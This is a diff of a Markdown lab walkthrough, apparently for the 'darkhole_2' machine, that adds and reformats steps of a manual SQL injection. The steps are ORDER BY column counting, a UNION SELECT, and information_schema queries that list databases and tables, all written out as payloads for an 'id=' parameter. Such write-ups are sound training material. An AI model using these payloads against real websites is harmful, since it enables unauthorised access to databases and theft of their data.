@@ -86,19 +86,34 @@ We noticed there the GET parameter called ‘id=’ We manually tried sql comman
 <img width="809" height="238" alt="image" src="https://github.com/user-attachments/assets/0b111729-5e13-4638-bedd-6e4c4f4f29a1" />
 
 We mostly benefited from the UNION query. However, we needed to identify the number of columns on that target table. For that, we used the ORDER BY query to see how many columns it stored.
-id=' ORDER BY 5 -- -
-id=' ORDER BY 6 -- - 
-id=' ORDER BY 7 -- - 
+
+    id=' ORDER BY 5 -- -
+    id=' ORDER BY 6 -- - 
+    id=' ORDER BY 7 -- - 
 
 <img width="797" height="425" alt="image" src="https://github.com/user-attachments/assets/e73d9dff-5088-4059-950f-57364393b001" />
 
 ORDER BY 7’ gave an error. We could now be sure there wasn’t a 7th column.
 <img width="993" height="168" alt="image" src="https://github.com/user-attachments/assets/b904c3ef-73c5-4773-8cb1-1e47ae548c29" />
 
-The following command then produced the outputs shown in Figure below. 
-id=' UNION SELECT 1,2,3,4,5,6 -- -
+The following command then produced the outputs shown in Figure below:
+
+    id=' UNION SELECT 1,2,3,4,5,6 -- -
 
 <img width="795" height="470" alt="image" src="https://github.com/user-attachments/assets/826660ea-18a9-4637-b04e-f520bdc315e7" />
 
 We noticed columns 2, 3, 5, and 6 are reflected in the user interface, indicating that these columns could be further used to dump data.
+
+We also found database name out by entering the following Sql command.
+
+    id=' UNION SELECT1,GROUP_CONCAT(schema_name),3,4,5,6 FROM information_schema.schemata-- -
+    <img width="717" height="506" alt="image" src="https://github.com/user-attachments/assets/562a87e7-7270-419a-b484-73d85897fcd0" />
+
+    
+To list and display the tables of the ‘darkhole_2’ database: 
+
+    id=' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema='darkhole_2'-- -
+    <img width="717" height="506" alt="image" src="https://github.com/user-attachments/assets/77ff648a-2c14-4f23-8159-adda1dc1d5ff" />
+
+
 
